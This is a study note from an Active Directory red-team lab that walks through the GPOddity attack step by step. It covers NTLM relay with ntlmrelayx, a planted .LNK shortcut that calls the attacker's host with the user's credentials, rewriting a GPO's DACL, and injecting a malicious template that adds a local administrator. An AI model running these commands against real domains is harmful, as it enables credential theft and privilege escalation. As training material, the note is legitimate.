# GPOddity

[GPOddity](https://github.com/synacktiv/GPOddity) combines NTLM relaying with the modification of a GPO:

1. The target user has `WriteDACL` over a GPO
2. Relay credentials of the target user for modifying the path of the GP template (`gPCFileSysPath`)
3. Load a malicious template from an attacker-controlled location

<figure><img src="https://x7331.gitbook.io/notes/~gitbook/image?url=https%3A%2F%2F3960676229-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FmjLkek16kB60c2WFd5lf%252Fuploads%252F2nD7PLJ5AwP0DXZSdqZM%252Fgpoddity_attack.png%3Falt%3Dmedia%26token%3Db2130241-680a-4386-a68b-481204a9a5a0&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=996a799&#x26;sv=2" alt=""><figcaption><p>The GPOddity attack (image taken from the <a href="https://www.alteredsecurity.com/post/certified-red-team-professional-crtp">CRTP</a> course).</p></figcaption></figure>

{% tabs %}
{% tab title="Recon" %}
The target user has `WriteDACL` over a GPO:

<figure><img src="https://x7331.gitbook.io/notes/~gitbook/image?url=https%3A%2F%2F3960676229-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FmjLkek16kB60c2WFd5lf%252Fuploads%252F6A8E449roph9oZi34DP5%252Fgpoddity_bh.png%3Falt%3Dmedia%26token%3D162041f2-f745-4e22-8934-444ceadb18bb&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=7278fe38&#x26;sv=2" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```powershell
# Get GPO's details with PowerView
> Get-DomainGPO -identity "DevOps Policy"

displayname              : DevOps Policy
name                     : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
cn                       : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
objectguid               : fc0df125-5e26-4794-93c7-e60c6eecb75f
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0BF8D01C-1F62-4BDC-958C-57140B67D147}
distinguishedname        : CN={0BF8D01C-1F62-4BDC-958C-57140B67D147},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```
{% endcode %}
{% endtab %}

{% tab title="Relay" %}
Relay the LDAP service on the DC (`172.16.2.1`) to the attack's machine (`172.160.100.37`):

{% code overflow="wrap" %}
```bash
sudo impacket-ntlmrelayx -t ldaps://172.16.2.1 -wh 172.16.100.37 --http-port "80,8080" -i -no-smb-server
```
{% endcode %}

Create a shortcut pointing to the attacker's relay server:

{% code overflow="wrap" %}
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.37' -UseDefaultCredentials"
```
{% endcode %}

Copy the `.LNK` file to the target share:

```sh
> xcopy .\student337.lnk \\dcorp-ci\AI
.\student337.lnk
1 File(s) copied
```

Back on the relay server:

{% code overflow="wrap" %}
```bash
[*] Servers started, waiting for connections
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Connection from 172.16.3.11 controlled, attacking target ldaps://172.16.2.1
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Authenticating against ldaps://172.16.2.1 as DCORP/DEVOPSADMIN SUCCEED
[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000 as DCORP/DEVOPSADMIN
```
{% endcode %}
{% endtab %}

{% tab title="WriteDACL" %}
Assign the `WriteDACL` permissions over the target GPO on the attacker (domain user):

```bash
$ nc 127.0.0.1 11000
Type help for list of commands

# whoami
u:dcorp\devopsadmin

# write_gpo_dacl student337 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
Adding student337 to GPO with GUID {0BF8D01C-1F62-4BDC-958C-57140B67D147}
LDAP server claims to have taken the secdescriptor. Have fun
```

Alternatively, if we don't have compromised a domain user, we can add a computer object and assign the permissions to it:

{% code overflow="wrap" %}
```bash
# add_computer std337-gpattack Secretpass@123
Attempting to add a new computer with the name: std337-gpattack$
Inferred Domain DN: DC=dollarcorp,DC=moneycorp,DC=local
Inferred Domain Name: dollarcorp.moneycorp.local
New Computer DN: CN=std337-gpattack,CN=Computers,DC=dollarcorp,DC=moneycorp,DC=local
Adding new computer with username: std337-gpattack$ and password: 
Secretpass@123 result: OK

# write_gpo_dacl std337-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
Adding std337-gpattack$ to GPO with GUID {0BF8D01C-1F62-4BDC-958C-57140B67D147}
LDAP server claims to have taken the secdescriptor. Have fun
```
{% endcode %}
{% endtab %}

{% tab title="GPOddity" %}
Execute the GPOddity attack:

{% code overflow="wrap" %}
```bash
# Create & inject a malicious template
sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 
'dollarcorp.moneycorp.local' --username 'student337' --password 'nUQfN3A8CcV7GxqT' --command 'net localgroup administrators student337 /add' --rogue-smbserver-ip '172.16.100.37' --rogue-smbserver-share 'std337-gp' --dc-ip '172.16.2.1' --smb-mode none
```
{% endcode %}

Create the share and move the malicious template to it:

```bash
# Create the share
mkdir /mnt/c/AD/Tools/std337-gp
# Move the template to the share
cp -r /mnt/c/AD/Tools/GPOddity/GPT_out/* /mnt/c/AD/Tools/std337-gp/
```

From a `SYSTEM` shell point configure the share's path and permissions:

```powershell
# Configure the share path
C:\Windows\system32>net share std337-gp=c:\AD\Tools\std337-gp
std337-gp was shared successfully.

# Provide full control to everyone
C:\Windows\system32>icacls "C:\AD\Tools\std337-gp" /grant Everyone:F /T
```

Check the policy's attribute with PowerView:

```powershell
> Get-DomainGPO -identity "DevOps Policy" | select gpcfilesyspath

gpcfilesyspath
--------------
\\172.16.100.37\std337-gp
```

When the policy refreshes:

```powershell
# Check admin access with PowerView
> Find-LocalAdminAccess
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-std337.dollarcorp.moneycorp.local
```
{% endtab %}
{% endtabs %}
